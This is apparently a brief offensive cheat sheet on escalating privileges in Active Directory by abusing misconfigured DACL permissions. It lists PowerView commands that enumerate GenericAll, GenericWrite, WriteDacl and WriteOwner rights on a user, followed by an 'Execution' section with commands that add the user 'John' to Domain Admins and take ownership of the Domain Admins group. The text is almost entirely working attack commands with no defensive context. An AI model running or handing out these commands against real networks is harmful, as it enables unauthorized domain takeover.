Discretionary Access Control List permissions is one of interesting on active directory environment which Most of the system administrators configure Discretionary Access Control List improperly which allow Unprivileged User to elevate their rivileged depending on what permission had been configured.

```
Get-ObjectAcl -SamAccountName itemployee35 | select ObjectDN,IdentityReference,ActiveDirectoryRights,ObjectType
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | select InheritedObjectType,IdentityReference,ActiveDirectoryRights
Get-ObjectAcl -SamAccountName John -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  | select IdentityReference,ActiveDirectoryRights
Get-ObjectAcl -SamAccountName John -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  | select IdentityReference,ActiveDirectoryRights,
Get-ObjectAcl -SamAccountName John -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  | select ActiveDirectoryRights ,IdentityReference,ObjectDN
Get-ObjectAcl -SamAccountName John -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  | select IdentityReference,ActiveDirectoryRights,ObjectType,ObjectDN
Get-ObjectAcl -SamAccountName John -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericWrite"}  | select IdentityReference,ActiveDirectoryRights,ObjectType,ObjectDN
Get-ObjectAcl -SamAccountName John -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "WriteDacl"}  | select IdentityReference,ActiveDirectoryRights,ObjectType,ObjectDN
Get-ObjectAcl -SamAccountName John -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "WriteOwner"} | select IdentityReference,ActiveDirectoryRights,ObjectType,ObjectDN

```

# Execution

# GenericAll 
```
net group "domain admins" John/add /domain
net user John /domain; Add-NetGroupUser -UserName John -GroupName "domain admins" -Domain "insomnia.io"; net user John /domain
```
# Self Permissions
```
net user John /domain; Add-NetGroupUser -UserName John -GroupName "domain admins" -Domain "insomnia.io"; net user John /domain
```
# WriteProperty
```
net group "domain admins" John /add /domain
```
# WriteOwner on Group
```
Set-DomainObjectOwner -Identity S-1-5-21-948911695-1962824894-4291460450-512 -OwnerIdentity "John" -Verbose
```
